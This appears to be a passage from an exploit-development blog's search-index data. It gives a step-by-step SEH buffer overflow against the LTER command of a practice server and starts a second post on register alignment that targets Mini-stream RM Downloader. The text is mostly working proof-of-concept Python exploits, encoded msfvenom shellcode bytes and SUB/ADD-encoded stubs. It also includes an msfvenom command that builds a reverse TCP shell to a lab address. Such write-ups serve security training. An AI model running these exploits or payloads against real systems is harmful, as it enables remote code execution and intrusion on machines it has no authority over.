"\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")buffer = \"LTER /.:/\" + \"A\" * 3515 + \"BBBB\" + \"CCCC\" + badchars + \"\\xff\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Checking the stack, we see an interesting response.This behaviour could determine that the amount of bytes given to execute once the flow is obtained is very limited to our needs. This may be an issue later on, but for now, we’ll simply switch the bad characters from the end of the buffer to the middle and see if that processes all of them!PoC code:import socket, sys, structbadchars = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\"\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")buffer = \"LTER /.:/\" + \"A\" * 2500 + badchars + \"A\" * (3515 - 2500 - len(badchars)) + \"BBBB\" + \"CCCC\" + \"\\xff\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Checking the stack, we see an interesting response.Interesting, it seems as after character 80, no other byte will be parsed as desired.Controlling the flow.As in any other SEH Based exploit, we require a PPR address, along with an jump, and, due to the fact that bytes such as EB and 90 are discarded, it must be ascii, such as a JO/JNO for example.Listing all modulesIt seems as essfunc.dll may help once again.Listing all PPR addresses within essfunc.dll.Nice! Now we can select the second or third address to use in order to overwrite the SEH value, as these are ascii printable.PoC code:import socket, sys, structnseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3515 + nseh + seh + \"C\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Response of the SEH Chain.If this is run, it will display a black screen, as 200 C’s are more than the server is able to handle. Due to this, we just grab a pointer address and scroll down, just to find our executed code.Time to play games.We have executed code! What now? We are not able to simply shove down an encoded msfvenom shell or aligning it nor calling it! Due to space issues and char restriction we find ourselves on a tricky scenario.In order to exploit this server, i came up with the following thinking: Inserting my purely alphanumeric payload using ESI way back at the beginning of the buffer. Aligning ESI to such. Use a PUSH ESI, follwed by a RET.This method sounds beautiful, doesn’t it? The main issue here is that the instruction RET has an opcode of C3, which means that it may not be parsed as we would like to, neither we can encode this opcode, as we don’t have enough space for that. To fix this, i decided to pursue the method of SUB/ADD encoding, in which a series of opcodes are encoded and then decoded if the ESP pointer is pointing at a lower address than this encoded instructions, i over simplified how this method works, but it is enough to know what it does.The order of these alignments would be the following: The value of ESP is inserted into EAX in order to perform calculations, and in EBX, just as a backup when it is time to execute the shellcode, as if the ESP has a similar address, it may execute your shellcode, but it will definitely crash the execution! It will be added to ax as much as needed in order to reach near the end of the buffer. This value is popped into ESP. The value of EBX is pushed into the stack and then popped into EAX in order to make calculations take less bytes. EAX is aligned into the pure alphanumeric shellcode. This value is popped into ESI. The SUB/ADD encoded series of 4 instructed will be sent: PUSH EBX, POP ESP; PUSH ESI, RET. This will push the value of EBX into the stack and pop it into ESP, and after that pushing ESI into the stack and then return the address through RET. Getting the opcodes for PUSH ESP, POP EAX; PUSH ESP, POP EBX. Also, i made sure to no longer use C’s as their instruction is INC EBX, this would mean that the value of EBX would be constantly incremented, something we do not want, right?root@whitecr0wz:~# msf-nasm_shell nasm &gt; PUSH ESPP00000000 54 push espnasm &gt; POP EAX00000000 58 pop eaxnasm &gt; PUSH ESP00000000 54 push espnasm &gt; POP EBX00000000 5B pop ebxnasm &gt; PoC code:import socket, sys, structalignment = \"\"alignment += \"\\x54\\x58\\x54\\x5B\"nseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3515 + nseh + seh + \"A\" * 2 + alignment + \"A\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Once the alignment is executed, it can be seen how EAX has the same value as ESP.The next step, is to turn the value of EAX near the end of the stack. The address i chose to perform the calculations is 0x017BFFFC.The next step, is to calculate the difference between 0x017BFFFC and 0x017BECA4, which can be easily done with the following program.#!/bin/bashprintf \"0x%X\\n\" $(($1 - $2))root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x017BFFFC 0x017BECA4 0x1358root@whitecr0wz:~/Exploit-Dev/LTER# As given, 0x1358 is the value needed to add to 0x017BECA4 in order to become 0x017BFFFC.The opcodes for such operation are found in msf-nasm_shell.nasm &gt; add ax, 0x135800000000 66055813 add ax,0x1358nasm &gt; The next step is to find the opcodes of PUSH EAX, POP ESP, this is done once again in msf-nasm_shell.nasm &gt; PUSH ESP00000000 54 push espnasm &gt; POP EBX00000000 5B pop ebxnasm &gt; PoC code:import socket, sys, structalignment = \"\"alignment += \"\\x54\\x58\\x54\\x5B\"alignment += \"\\x66\\x05\\x58\\x13\"alignment += \"\\x50\\x5C\"nseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3515 + nseh + seh + \"A\" * 2 + alignment + \"A\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()The alignment seems to have done its work as intended.The next step is pointing ESI to the shellcode, to do this, alphanumeric shellcode using the ESI register is generated, and the value of EBX is pushed into the stack and popped into EAX, in order to make the calculations smaller.root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/alpha_mixedx86/alpha_mixed succeeded with size 440 (iteration=0)x86/alpha_mixed chosen with final size 440Payload size: 440 bytesFinal size of py file: 2145 bytesbuf = b\"\"buf += b\"\\x56\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x49\\x6c\\x38\\x68\\x6c\\x42\\x37\\x70\\x43\\x30\\x33\\x30\\x63\"buf += b\"\\x50\\x4f\\x79\\x48\\x65\\x75\\x61\\x4f\\x30\\x31\\x74\\x6e\\x6b\"buf += b\"\\x36\\x30\\x76\\x50\\x6c\\x4b\\x31\\x42\\x54\\x4c\\x6c\\x4b\\x62\"buf += b\"\\x72\\x64\\x54\\x4e\\x6b\\x54\\x32\\x37\\x58\\x44\\x4f\\x6e\\x57\"buf += b\"\\x73\\x7a\\x47\\x56\\x70\\x31\\x79\\x6f\\x6e\\x4c\\x55\\x6c\\x71\"buf += b\"\\x71\\x73\\x4c\\x75\\x52\\x44\\x6c\\x65\\x70\\x6f\\x31\\x48\\x4f\"buf += b\"\\x54\\x4d\\x33\\x31\\x6a\\x67\\x49\\x72\\x39\\x62\\x30\\x52\\x31\"buf += b\"\\x47\\x6e\\x6b\\x76\\x32\\x36\\x70\\x4c\\x4b\\x73\\x7a\\x77\\x4c\"buf += b\"\\x6e\\x6b\\x30\\x4c\\x77\\x61\\x30\\x78\\x4a\\x43\\x43\\x78\\x37\"buf += b\"\\x71\\x78\\x51\\x66\\x31\\x6c\\x4b\\x42\\x79\\x31\\x30\\x45\\x51\"buf += b\"\\x5a\\x73\\x4c\\x4b\\x70\\x49\\x66\\x78\\x6b\\x53\\x46\\x5a\\x31\"buf += b\"\\x59\\x6c\\x4b\\x56\\x54\\x4e\\x6b\\x35\\x51\\x79\\x46\\x64\\x71\"buf += b\"\\x4b\\x4f\\x6e\\x4c\\x7a\\x61\\x5a\\x6f\\x46\\x6d\\x56\\x61\\x78\"buf += b\"\\x47\\x67\\x48\\x49\\x70\\x73\\x45\\x4a\\x56\\x44\\x43\\x73\\x4d\"buf += b\"\\x7a\\x58\\x77\\x4b\\x43\\x4d\\x65\\x74\\x31\\x65\\x68\\x64\\x72\"buf += b\"\\x78\\x6c\\x4b\\x31\\x48\\x34\\x64\\x73\\x31\\x5a\\x73\\x75\\x36\"buf += b\"\\x4c\\x4b\\x76\\x6c\\x50\\x4b\\x6e\\x6b\\x76\\x38\\x77\\x6c\\x76\"buf += b\"\\x61\\x5a\\x73\\x6c\\x4b\\x74\\x44\\x4e\\x6b\\x35\\x51\\x6a\\x70\"buf += b\"\\x4c\\x49\\x37\\x34\\x47\\x54\\x64\\x64\\x43\\x6b\\x51\\x4b\\x65\"buf += b\"\\x31\\x76\\x39\\x70\\x5a\\x33\\x61\\x49\\x6f\\x4d\\x30\\x53\\x6f\"buf += b\"\\x33\\x6f\\x43\\x6a\\x6c\\x4b\\x65\\x42\\x48\\x6b\\x4c\\x4d\\x71\"buf += b\"\\x4d\\x31\\x7a\\x75\\x51\\x6e\\x6d\\x6b\\x35\\x48\\x32\\x63\\x30\"buf += b\"\\x67\\x70\\x33\\x30\\x30\\x50\\x55\\x38\\x45\\x61\\x6e\\x6b\\x52\"buf += b\"\\x4f\\x6f\\x77\\x4b\\x4f\\x4e\\x35\\x6f\\x4b\\x6d\\x30\\x47\\x6d\"buf += b\"\\x44\\x6a\\x66\\x6a\\x31\\x78\\x4c\\x66\\x4e\\x75\\x4f\\x4d\\x6f\"buf += b\"\\x6d\\x4b\\x4f\\x68\\x55\\x67\\x4c\\x33\\x36\\x71\\x6c\\x77\\x7a\"buf += b\"\\x6b\\x30\\x69\\x6b\\x59\\x70\\x30\\x75\\x73\\x35\\x4d\\x6b\\x72\"buf += b\"\\x67\\x57\\x63\\x53\\x42\\x52\\x4f\\x63\\x5a\\x53\\x30\\x36\\x33\"buf += b\"\\x59\\x6f\\x58\\x55\\x53\\x53\\x70\\x61\\x42\\x4c\\x70\\x63\\x46\"buf += b\"\\x4e\\x72\\x45\\x32\\x58\\x65\\x35\\x53\\x30\\x41\\x41\"nasm &gt; PUSH EBX00000000 53 push ebxnasm &gt; POP EAX00000000 58 pop eax PoC code:import socket, sys, struct[shellcode]alignment = \"\"alignment += \"\\x54\\x58\\x54\\x5B\"alignment += \"\\x66\\x05\\x58\\x13\"alignment += \"\\x50\\x5C\"alignment += \"\\x53\\x58\"nseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3 + buf + \"A\" * (3515 - 3 - len(buf)) + nseh + seh + \"A\" * 2 + alignment + \"A\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Once this is sent, it can be seen near the start of our buffer.The following step is to make EAX point to the shellcode, so it can be inserted in ESI later on.Calculating the address of the start of the shellcode against the value of EAX.root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x0185F20C 0x0185ECA4 0x568root@whitecr0wz:~/Exploit-Dev/LTER# Getting the values for the calculation.nasm &gt; add ax, 0x568 00000000 66056805 add ax,0x568nasm &gt; The opcodes required for PUSH EAX, POP ESI.nasm &gt; PUSH EAX 00000000 50 push eaxnasm &gt; POP ESI00000000 5E pop esi PoC code:import socket, sys, struct[shellcode]alignment = \"\"alignment += \"\\x54\\x58\\x54\\x5B\"alignment += \"\\x66\\x05\\x58\\x13\"alignment += \"\\x50\\x5C\"alignment += \"\\x53\\x58\"alignment += \"\\x66\\x05\\x68\\x05\"alignment += \"\\x50\\x5E\"nseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3 + buf + \"A\" * (3515 - 3 - len(buf)) + nseh + seh + \"A\" * 2 + alignment + \"A\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()ESI is now pointing into the shellcode!As we may see on the following image, we still have some space to insert our SUB/ADD encoded PUSH EBX, POP ESP, PUSH ESI, RET.Getting the opcodes for such operationnasm &gt; PUSH EBX00000000 53 push ebxnasm &gt; POP ESP 00000000 5C pop espnasm &gt; PUSH ESI 00000000 56 push esinasm &gt; RET00000000 C3 ret For encoding these opcodes through this method, i will use slink from ihack4falafel.root@whitecr0wz:~/Exploit-Dev/LTER# slinkEnter your shellcode: \\x53\\x5C\\x56\\xC3Enter shellcode variable name: pushesi[+] Shellcode size is divisible by 4[*] Encoding [c3565c53]..[+] No bad character found, using default encoder..pushesi += \"\\x25\\x4A\\x4D\\x4E\\x55\" ## and eax, 0x554e4d4apushesi += \"\\x25\\x35\\x32\\x31\\x2A\" ## and eax, 0x2a313235pushesi += \"\\x05\\x32\\x36\\x33\\x62\" ## add eax, 0x62333632pushesi += \"\\x05\\x21\\x26\\x23\\x61\" ## add eax, 0x61232621pushesi += \"\\x50\" ## push eax[*] Shellcode final size: 21 bytesroot@whitecr0wz:~/Exploit-Dev/LTER# Final PoC:import socket, sys, struct# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread# Payload size: 440 bytesbuf = b\"\"buf += b\"\\x56\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x49\\x6c\\x38\\x68\\x6c\\x42\\x37\\x70\\x43\\x30\\x33\\x30\\x63\"buf += b\"\\x50\\x4f\\x79\\x48\\x65\\x75\\x61\\x4f\\x30\\x31\\x74\\x6e\\x6b\"buf += b\"\\x36\\x30\\x76\\x50\\x6c\\x4b\\x31\\x42\\x54\\x4c\\x6c\\x4b\\x62\"buf += b\"\\x72\\x64\\x54\\x4e\\x6b\\x54\\x32\\x37\\x58\\x44\\x4f\\x6e\\x57\"buf += b\"\\x73\\x7a\\x47\\x56\\x70\\x31\\x79\\x6f\\x6e\\x4c\\x55\\x6c\\x71\"buf += b\"\\x71\\x73\\x4c\\x75\\x52\\x44\\x6c\\x65\\x70\\x6f\\x31\\x48\\x4f\"buf += b\"\\x54\\x4d\\x33\\x31\\x6a\\x67\\x49\\x72\\x39\\x62\\x30\\x52\\x31\"buf += b\"\\x47\\x6e\\x6b\\x76\\x32\\x36\\x70\\x4c\\x4b\\x73\\x7a\\x77\\x4c\"buf += b\"\\x6e\\x6b\\x30\\x4c\\x77\\x61\\x30\\x78\\x4a\\x43\\x43\\x78\\x37\"buf += b\"\\x71\\x78\\x51\\x66\\x31\\x6c\\x4b\\x42\\x79\\x31\\x30\\x45\\x51\"buf += b\"\\x5a\\x73\\x4c\\x4b\\x70\\x49\\x66\\x78\\x6b\\x53\\x46\\x5a\\x31\"buf += b\"\\x59\\x6c\\x4b\\x56\\x54\\x4e\\x6b\\x35\\x51\\x79\\x46\\x64\\x71\"buf += b\"\\x4b\\x4f\\x6e\\x4c\\x7a\\x61\\x5a\\x6f\\x46\\x6d\\x56\\x61\\x78\"buf += b\"\\x47\\x67\\x48\\x49\\x70\\x73\\x45\\x4a\\x56\\x44\\x43\\x73\\x4d\"buf += b\"\\x7a\\x58\\x77\\x4b\\x43\\x4d\\x65\\x74\\x31\\x65\\x68\\x64\\x72\"buf += b\"\\x78\\x6c\\x4b\\x31\\x48\\x34\\x64\\x73\\x31\\x5a\\x73\\x75\\x36\"buf += b\"\\x4c\\x4b\\x76\\x6c\\x50\\x4b\\x6e\\x6b\\x76\\x38\\x77\\x6c\\x76\"buf += b\"\\x61\\x5a\\x73\\x6c\\x4b\\x74\\x44\\x4e\\x6b\\x35\\x51\\x6a\\x70\"buf += b\"\\x4c\\x49\\x37\\x34\\x47\\x54\\x64\\x64\\x43\\x6b\\x51\\x4b\\x65\"buf += b\"\\x31\\x76\\x39\\x70\\x5a\\x33\\x61\\x49\\x6f\\x4d\\x30\\x53\\x6f\"buf += b\"\\x33\\x6f\\x43\\x6a\\x6c\\x4b\\x65\\x42\\x48\\x6b\\x4c\\x4d\\x71\"buf += b\"\\x4d\\x31\\x7a\\x75\\x51\\x6e\\x6d\\x6b\\x35\\x48\\x32\\x63\\x30\"buf += b\"\\x67\\x70\\x33\\x30\\x30\\x50\\x55\\x38\\x45\\x61\\x6e\\x6b\\x52\"buf += b\"\\x4f\\x6f\\x77\\x4b\\x4f\\x4e\\x35\\x6f\\x4b\\x6d\\x30\\x47\\x6d\"buf += b\"\\x44\\x6a\\x66\\x6a\\x31\\x78\\x4c\\x66\\x4e\\x75\\x4f\\x4d\\x6f\"buf += b\"\\x6d\\x4b\\x4f\\x68\\x55\\x67\\x4c\\x33\\x36\\x71\\x6c\\x77\\x7a\"buf += b\"\\x6b\\x30\\x69\\x6b\\x59\\x70\\x30\\x75\\x73\\x35\\x4d\\x6b\\x72\"buf += b\"\\x67\\x57\\x63\\x53\\x42\\x52\\x4f\\x63\\x5a\\x53\\x30\\x36\\x33\"buf += b\"\\x59\\x6f\\x58\\x55\\x53\\x53\\x70\\x61\\x42\\x4c\\x70\\x63\\x46\"buf += b\"\\x4e\\x72\\x45\\x32\\x58\\x65\\x35\\x53\\x30\\x41\\x41\"alignment = \"\"alignment += \"\\x54\\x58\\x54\\x5B\"alignment += \"\\x66\\x05\\x58\\x13\"alignment += \"\\x50\\x5C\"alignment += \"\\x53\\x58\"alignment += \"\\x66\\x05\\x68\\x05\"alignment += \"\\x50\\x5E\"# root@whitecr0wz:~/Exploit-Dev/LTER# slink# Enter your shellcode: \\x53\\x5C\\x56\\xC3# Enter shellcode variable name: pushesi# [+] Shellcode size is divisible by 4# [*] Encoding [c3565c53]..# [+] No bad character found, using default encoder..# [*] Shellcode final size: 21 bytespushesi = \"\"pushesi += \"\\x25\\x4A\\x4D\\x4E\\x55\" ## and eax, 0x554e4d4apushesi += \"\\x25\\x35\\x32\\x31\\x2A\" ## and eax, 0x2a313235pushesi += \"\\x05\\x32\\x36\\x33\\x62\" ## add eax, 0x62333632pushesi += \"\\x05\\x21\\x26\\x23\\x61\" ## add eax, 0x61232621pushesi += \"\\x50\" ## push eaxnseh = struct.pack(\"&lt;I\", 0x06710870)seh = struct.pack(\"&lt;I\", 0x6250195E)buffer = \"LTER /.:/\" + \"A\" * 3 + buf + \"A\" * (3515 - 3 - len(buf)) + nseh + seh + \"A\" * 2 + alignment + pushesi + \"A\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()If we add some breakpoints at the end of the SUB/ADD instructions, we may see how to instructions get decoded as we step through!EBX gets pushed into the stack and is popped into ESP.ESI is finally pushed into the stack and then returned, leading the flow to our shellcode.It is only left for us to run the program and execute the shellcode!This was fun, but as we have a lot of space due to the location of our shellcode, we can easily just swap it into a reverse shell.Command used for generating the shellcode.root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread After running it, the reverse-shell was achieved.If you wish to see the full exploit, you can have it Thanks for reading the post! Until next time!" }, { "title": "Alignments on Windows Registers", "url": "/posts/Alignments-on-windows-registers/", "categories": "Binary Exploitation", "tags": "assembly, shellcoding, vulnerability", "date": "2021-02-01 05:44:00 +0000", "snippet": "PreambleWelcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Exploitation.Also, i would like to say that if by any means you find an error within this post, please let me know! I am still a beginner.Small requirementsDespite the fact that these techniques do not require much knowledge, having beginner/intermediate experience with Assembly may help.Explanation of the conceptThe definition of the word “alignment” is “arrangement in a straight line or in correct relative positions.”, meaning that, when applied to CPU registers, it would refer to having two or more variables with the same value.Why aligning registers?In order to execute shellcode within a stack, the payload will have to work directly with a register pointing to its address. For example, msfvenom always includes 6 additional bytes within all generated payloads, whose function is to align a register, so the rest can work with such. However, not all softwares may accept such characters, issue which brings us to this post!Stack OverflowsTo begin with an easy practice, it will be shown how a JMP/CALL/PUSH ESP instruction does everything that was done previously, by overwriting the EIP value, as it automatically aligns the ESP value with the previous one, doing the entire work for us!Current poc:import struct pushesp = struct.pack(\"&lt;I\", 0x1003DF53) # 0x1003df53 : \"\\x54\\xC3\" | {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Program Files\\Mini-stream\\RM Downloader\\RDfilter03.dll)buffer = \"A\" * 8704 + pushesp + \"\\xff\" * 200f = open (\"poc.txt\", \"w\")f.write(buffer)f.close()Once the script is run and the explotation process is completed, the debugger greets us with the following result:It is important to note the values of the ESP and EIP registers, as they have been aligned by the PUSH ESP instruction.The next step would usually be parsing some nops and introducing our shellcode. However, there is an alternative way to execute shellcode, as the ESP pointer has already been aligned to the EIP, it is possible to generate shellcode that directly works with the ESP pointer, instead of aligning the registers again. Moreover, the introduction of other bytes that are not related with the shellcode (such as a nop, or anything else), will dealign the ESP register.The sent payload changes from:offset + ret + nops + shellcodeTo:offset + ret + shellcodeIn order to perform this, the flag “BufferRegister=REG32” shall be used with msfvenom. Additionally, the shellcode should be generated with alphanumeric bytes, as it will become a completely alphanumeric shellcode instead of the regular one, whose first 6 bytes will always be non-alphanumeric, this done so that the shellcode does not cause any issue.The shellcode is generated:root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=ESP [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/alpha_mixedx86/alpha_mixed succeeded with size 440 (iteration=0)x86/alpha_mixed chosen with final size 440Payload size: 440 bytesFinal size of py file: 2145 bytesbuf = b\"\"buf += b\"\\x54\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += b\"\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"buf += b\"\\x79\\x6c\\x48\\x68\\x6f\\x72\\x47\\x70\\x43\\x30\\x67\\x70\\x75\"buf += b\"\\x30\\x4e\\x69\\x48\\x65\\x55\\x61\\x59\\x50\\x51\\x74\\x4e\\x6b\"buf += b\"\\x32\\x70\\x64\\x70\\x4c\\x4b\\x73\\x62\\x36\\x6c\\x6e\\x6b\\x70\"buf += b\"\\x52\\x76\\x74\\x6e\\x6b\\x44\\x32\\x51\\x38\\x74\\x4f\\x4e\\x57\"buf += b\"\\x61\\x5a\\x65\\x76\\x76\\x51\\x49\\x6f\\x4c\\x6c\\x67\\x4c\\x35\"buf += b\"\\x31\\x51\\x6c\\x47\\x72\\x34\\x6c\\x45\\x70\\x4b\\x71\\x78\\x4f\"buf += b\"\\x44\\x4d\\x57\\x71\\x4b\\x77\\x49\\x72\\x39\\x62\\x42\\x72\\x53\"buf += b\"\\x67\\x6e\\x6b\\x70\\x52\\x62\\x30\\x6e\\x6b\\x53\\x7a\\x45\\x6c\"buf += b\"\\x4e\\x6b\\x52\\x6c\\x72\\x31\\x30\\x78\\x78\\x63\\x52\\x68\\x77\"buf += b\"\\x71\\x58\\x51\\x50\\x51\\x4c\\x4b\\x66\\x39\\x61\\x30\\x47\\x71\"buf += b\"\\x7a\\x73\\x6c\\x4b\\x77\\x39\\x47\\x68\\x5a\\x43\\x66\\x5a\\x51\"buf += b\"\\x59\\x4e\\x6b\\x47\\x44\\x6c\\x4b\\x66\\x61\\x39\\x46\\x65\\x61\"buf += b\"\\x69\\x6f\\x6c\\x6c\\x7a\\x61\\x7a\\x6f\\x44\\x4d\\x46\\x61\\x6a\"buf += b\"\\x67\\x36\\x58\\x79\\x70\\x63\\x45\\x49\\x66\\x65\\x53\\x53\\x4d\"buf += b\"\\x4c\\x38\\x37\\x4b\\x53\\x4d\\x71\\x34\\x51\\x65\\x59\\x74\\x51\"buf += b\"\\x48\\x6c\\x4b\\x53\\x68\\x67\\x54\\x45\\x51\\x6e\\x33\\x72\\x46\"buf += b\"\\x6e\\x6b\\x36\\x6c\\x72\\x6b\\x4c\\x4b\\x63\\x68\\x45\\x4c\\x45\"buf += b\"\\x51\\x6b\\x63\\x4c\\x4b\\x55\\x54\\x6c\\x4b\\x37\\x71\\x78\\x50\"buf += b\"\\x6e\\x69\\x50\\x44\\x55\\x74\\x75\\x74\\x73\\x6b\\x61\\x4b\\x45\"buf += b\"\\x31\\x63\\x69\\x53\\x6a\\x63\\x61\\x6b\\x4f\\x6d\\x30\\x71\\x4f\"buf += b\"\\x53\\x6f\\x52\\x7a\\x4e\\x6b\\x46\\x72\\x38\\x6b\\x4c\\x4d\\x73\"buf += b\"\\x6d\\x62\\x4a\\x73\\x31\\x4c\\x4d\\x6f\\x75\\x58\\x32\\x57\\x70\"buf += b\"\\x65\\x50\\x65\\x50\\x50\\x50\\x50\\x68\\x64\\x71\\x6e\\x6b\\x42\"buf += b\"\\x4f\\x4f\\x77\\x69\\x6f\\x6a\\x75\\x4d\\x6b\\x59\\x70\\x65\\x4d\"buf += b\"\\x55\\x7a\\x75\\x5a\\x75\\x38\\x6e\\x46\\x6d\\x45\\x4d\\x6d\\x4f\"buf += b\"\\x6d\\x69\\x6f\\x38\\x55\\x47\\x4c\\x65\\x56\\x33\\x4c\\x55\\x5a\"buf += b\"\\x6b\\x30\\x6b\\x4b\\x59\\x70\\x54\\x35\\x73\\x35\\x4f\\x4b\\x72\"buf += b\"\\x67\\x37\\x63\\x50\\x72\\x30\\x6f\\x70\\x6a\\x65\\x50\\x66\\x33\"buf += b\"\\x49\\x6f\\x6e\\x35\\x72\\x43\\x35\\x31\\x70\\x6c\\x33\\x53\\x64\"buf += b\"\\x6e\\x71\\x75\\x34\\x38\\x71\\x75\\x77\\x70\\x41\\x41\"root@whitecr0wz:~# Final poc:import struct # msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread BufferRegister=ESP # Payload size: 440 bytesbuf = b\"\"buf += b\"\\x54\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\"buf += b\"\\x49\\x49\\x49\\x49\\x49\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\"buf += b\"\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\"buf += 